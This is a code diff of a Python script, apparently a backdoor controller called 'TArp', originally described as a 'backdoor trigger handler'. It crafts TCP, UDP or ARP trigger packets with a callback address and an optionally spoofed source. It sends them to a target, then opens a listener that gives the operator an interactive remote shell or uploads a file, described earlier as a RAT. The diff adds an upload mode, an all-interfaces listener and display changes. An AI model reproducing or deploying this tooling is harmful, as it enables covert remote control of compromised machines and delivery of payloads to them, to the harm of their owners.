@@ -8,7 +8,24 @@ import select
 import argparse
 import netifaces
 from scapy.all import *
-    
+
+OKBLUE       = '\033[94m'
+RED          = '\033[31m'
+RED_BLINK    = '\033[31;5m'
+RED_BOLD     = '\033[31;1m'
+RESET        = '\033[0m'
+YELLOW       = '\033[33m'
+YELLOW_BLINK = '\033[33;5m'
+OVERWRITE    = '\033[1000D'
+
+class Display(object):
+
+    def alert(self,message):
+        print "[%s!%s] %s" % (YELLOW_BLINK,RESET,message)
+
+    def info(self,message):
+        print "[%s*%s] %s" % (RED,RESET,message)
+
 # Acquire local address (hopefully not picking the loopback address)
 local_addresses = []
 for interface in netifaces.interfaces():
@@ -16,31 +33,42 @@ for interface in netifaces.interfaces():
 
 local_ip = local_addresses[-1]
 
-banner = "" +\
+banner = "" + RED +\
 u"                    ██╗ ██████╗ ███████╗ ██╗\n" +\
 u"                    ██║██╔════╝ ██╔════╝ ██║\n" +\
 u"                    ██║██║  ███╗███████╗ ██║\n" +\
 u"               ██   ██║██║   ██║╚════██║ ██║\n" +\
 u"               ╚█████╔╝╚██████╔╝███████║ ██║\n" +\
-u"                ╚════╝  ╚═════╝ ╚══════╝ ╚═╝\n" 
+u"                ╚════╝  ╚═════╝ ╚══════╝ ╚═╝\n\n" + RESET
 
-# Verify if provided IP Address is valid
+# define type parsers for argument input
+#verifies provided IP is valid
 def parse_ip(ipaddr):
     if not netaddr.valid_ipv4(ipaddr):
         msg = "Not a valid IP address (%s)" % ipaddr
         raise argparse.ArgumentTypeError(msg)
     return ipaddr
 
+#verifies file can be opened for reading
+def open_file(in_file):
+    try:
+        f = open(in_file,'rb')
+    except IOError as err:
+        print in_file
+        print err.strerror
+        sys.exit(2)
+    return f
+
 # Define parser arguments
 parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
-        description = banner + "The TArp backdoor trigger handler." +\
-        " Builds the ARP, TCP, or UDP trigger\n packet and handles the specified callback.")
+        description = banner + "The TArp trigger handler." +\
+        " Builds the ARP, TCP, or UDP trigger packet and \nhandles the specified callback.")
 
-parser.add_argument("-t", default="tcp", metavar="arp|tcp|udp", dest="t_type",
+parser.add_argument("-t", default="tcp", metavar="", dest="t_type",
         choices=["arp","tcp","udp"], type=str.lower,
         help="Specify the trigger type. (default: tcp)")
 
-parser.add_argument("-c", default=local_ip ,type=parse_ip, metavar="<IP>", dest="c_addr",
+parser.add_argument("-c", default=local_ip ,type=parse_ip, metavar="", dest="c_addr",
         help="Callback IP Address. (default: %s)" % local_ip)
 
 parser.add_argument("-p", default=8055, type=int, choices=range(1,65535),
@@ -48,17 +76,20 @@ parser.add_argument("-p", default=8055, type=int, choices=range(1,65535),
         help="Callback Port number. (default: 8055)")
 
 parser.add_argument("-s", default=local_ip,
-        type=parse_ip, metavar="SOURCE", dest="source",
+        type=parse_ip, metavar="", dest="source",
         help="Source Address for trigger packet. (default: %s)" % local_ip)
 
-parser.add_argument("-m", default="shell", metavar="MODE", dest="mode",
-        help="Mode type. Either shell callback or RAT upload. (default: shell)")
+parser.add_argument("-U", default=False, metavar="FILE", dest="upload",
+        type=open_file,
+        help="Upload file. Without this flag implies shell callback.")
 
+parser.add_argument("-f", action="store_true", dest="force",
+        help="Force listener on all interfaces.")
 
 parser.add_argument("target", type=parse_ip, metavar="TARGET",
         help="Target IP Address.")
 
-def display_trigger(p,args):
+def trigger_prompt(p,args):
     '''
     Displays the created trigger that will be sent to the target
     for verification of details prior to firing.
@@ -77,6 +108,11 @@ def display_trigger(p,args):
         print "=====Callback Data====="
         print "IP    : %s" % args.c_addr
         print "Port  : %s" % args.c_port
+        if args.upload:
+            print "======File Upload======"
+            print args.upload.name
+        else:
+            print "====Shell Callback====="
         print "======================="
 
         while True:
@@ -89,13 +125,17 @@ def display_trigger(p,args):
     else:
 
         print "\nPreparing to send a trigger packet with the folowing details...\n"
-        print "=======ARP Header======"
+        print "========ARP Header========"
         print "HwDst  : %s" % p.hwdst
         print "HwSrc  : %s" % ":".join(p.hwsrc)
-        print "=====Callback Data====="
+        print "======Callback Data======="
         print "IP    : %s" % args.c_addr
         print "Port  : %s" % args.c_port
-        print "======================="
+        if args.upload:
+            print "=======File Upload========"
+        else:
+            print "======Shell Callback======="
+        print "=========================="
         
         while True:
             resp = raw_input("\nReady to send it? ").lower()
@@ -106,8 +146,11 @@ def display_trigger(p,args):
                 sys.exit()
 
 def handle_shell(callback, c_info):
+    sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
+    sys.stdout.flush()
     while True:
 
+        # ulitizes select to determine which stream has data to be received from
         sock_list = [sys.stdin,callback]
         read_sockets, write_socket, error_socket = select(sock_list,[],[])
 
@@ -120,7 +163,7 @@ def handle_shell(callback, c_info):
                     data += message
                     if message[-1] == "\n":
                         break
-                sys.stdout.write("\n" + data + "%s>" % c_info[0])
+                sys.stdout.write("\n" + data + "%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                 sys.stdout.flush()
             else:
                 message = sys.stdin.readline().strip()
@@ -128,35 +171,51 @@ def handle_shell(callback, c_info):
                     break
                 else:
                     callback.send(message + '\n')
-                    sys.stdout.write("%s>" % c_info[0])
+                    sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                     sys.stdout.flush()
 
         if message == "exit":
+            callback.send(message + '\n')
+            callback.shutdown(socket.SHUT_RDWR)
+            callback.close()
             break
+
+def handle_upload(sock, fd):
+   
+    chunk = fd.read(1024)
+    total = 0
+    while(chunk):
+        sock.send(chunk)
+        total += len(chunk)
+        print "Sent %d bytes" % total
+        chunk = fd.read(1024)
+    fd.close()
+    sock.close()
+
 
 def main():
 
     # Parse commandline arguments
     args = parser.parse_args()
-
+    display = Display()
 
     if args.t_type == "tcp":
 
-        ip_layer = IP(dst=args.target)
+        ip_layer = IP(dst=args.target,src=args.source)
         tcp_layer = TCP(dport=22,sport=45555)
         callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
         trigger = ip_layer/tcp_layer/callback
         
-        display_trigger(trigger,args)
+        trigger_prompt(trigger,args)
 
     elif args.t_type == "udp":
 
-        ip_layer = IP(dst=args.target)
+        ip_layer = IP(dst=args.target,src=args.source)
         udp_layer = UDP(dport=123,sport=45555)
         callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
         trigger = ip_layer/udp_layer/callback
 
-        display_trigger(trigger,args)
+        trigger_prompt(trigger,args)
 
     elif args.t_type == "arp":
 
@@ -170,36 +229,55 @@ def main():
  
         trigger = ARP(pdst = args.target, hwdst = "ff:fe:ff:ff:fe:ff", hwsrc = callback)
 
-        display_trigger(trigger,args)
+        trigger_prompt(trigger,args)
 
-    if args.c_addr in local_addresses:
+    if args.c_addr in local_addresses or args.force:
 
-        print "[*] Preparing listener."
+        #print "[%s*%s] Preparing listener." 
+        display.info("Preparing listener.")
 
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.settimeout(30)
         try:
-            s.bind((args.c_addr,args.c_port))
-            s.listen(1)
+            if args.force:
+                s.bind(("0.0.0.0",args.c_port))
+                s.listen(1)
+            else:
+                s.bind((args.c_addr,args.c_port))
+                s.listen(1)
         except:
-            print "[!] Failed to bind listener"
+            #print "[!] Failed to bind listener" % (YELLOW_BINK,RESET)
+            display.alert("Failed to bind listener")
+            sys.exit(1)
 
-        print "[*] Ready to receive callback. Sending trigger!"
+        #print "[*] Ready to receive callback. Sending trigger!" % (RED_BLINK,RESET)
+        display.info("Ready to receive callback. Sending trigger!")
         send(trigger)
         
-        print "[*] Waiting for callback....."
-        callback, c_info = s.accept()
-        print "[!] Received connection from %s" % c_info[0]
+        #print "[*] Waiting for callback....." % (RED_BLINK,RESET)
+        display.info("Waiting for callback....")
+        try:
+            callback, c_info = s.accept()
+            #print "[%s!%s] Received connection from %s" % (YELLOW_BLINK,c_info[0],RESET)
+            display.alert("Received connection from %s" % c_info[0])
+        except socket.timeout:
+            #print "[%s!%s] No response, exiting..." % (YELLOW_BLINK,RESET)
+            display.alert("No response, exiting...")
+            sys.exit(1)
 
-        if args.mode == "shell":
-            sys.stdout.write("%s>" % c_info[0])
-            sys.stdout.flush()
+        if not args.upload:
             handle_shell(callback, c_info)
+        else:
+            display.info("Uploading file..")
+            handle_upload(callback, args.upload)
+            display.info("File upload complete.")
 
     else:
 
-        print "\n[!] Callback address does not appear to be on this box.\n Ensure a " +\
-                "listener is ready.\n"
+        #print "\n[!] Callback address does not appear to be on this box.\n Ensure a " +\
+                #"listener is ready.\n"
+        display.alert("Callback address not on this box. Ensure a listener is ready.")
         raw_input("Press [ENTER] to continue....")
         send(trigger)
 
